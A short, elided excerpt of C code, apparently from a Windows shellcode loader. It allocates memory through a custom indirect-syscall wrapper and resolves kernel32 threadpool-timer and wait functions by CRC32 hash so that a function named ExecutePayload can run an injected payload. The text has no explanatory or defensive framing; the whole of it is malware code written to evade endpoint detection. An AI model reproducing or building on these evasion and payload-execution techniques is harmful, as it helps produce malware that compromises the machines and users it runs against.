...
//---------------------------------------------------------------------------------------------------------------------------------------------
	...
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READONLY))) {
#ifdef DEBUG
...
VOID ExecutePayload(IN PVOID pInjectedPayload) {
	...
	fnCreateThreadpoolTimer				pCreateThreadpoolTimer				= (fnCreateThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), CreateThreadpoolTimer_CRC32);
	fnSetThreadpoolTimer				pSetThreadpoolTimer					= (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), SetThreadpoolTimer_CRC32);
	fnWaitForSingleObject				pWaitForSingleObject				= (fnWaitForSingleObject)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), WaitForSingleObject_CRC32);
